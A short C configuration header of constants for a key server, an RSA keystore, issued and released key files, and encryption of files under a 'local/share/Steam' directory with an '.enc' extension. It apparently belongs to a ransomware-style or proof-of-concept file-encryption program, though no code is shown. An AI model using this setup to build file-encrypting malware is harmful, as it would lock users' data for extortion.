#ifndef CONFIG_H_
#define CONFIG_H_
#define CONFIG_SV_ADDR "127.0.0.1"
#define CONFIG_SV_PORT 55555
#define CONFIG_RSA_KSIZE 1024
#define CONFIG_KEYDIR "etc/keystore"
#define CONFIG_KEYFILE_EXT ".key"
#define CONFIG_ISSUED "etc/keys_issued"
#define CONFIG_RELEASED "etc/keys_released"
#define CONFIG_CRYPTDIR "local/share/Steam"
#define CONFIG_CRYPTED_EXT ".enc"
#define CONFIG_PREGEN_KEYS 128
#define CONFIG_REGEN_KEYS 96
#define CONFIG_KEYGEN_SLEEP 60
#define CONFIG_RC4_DROP 4096
#define CONFIG_PREALLOC_FILES 16
#define CONFIG_KEYTAB_SIZE 128
#endif
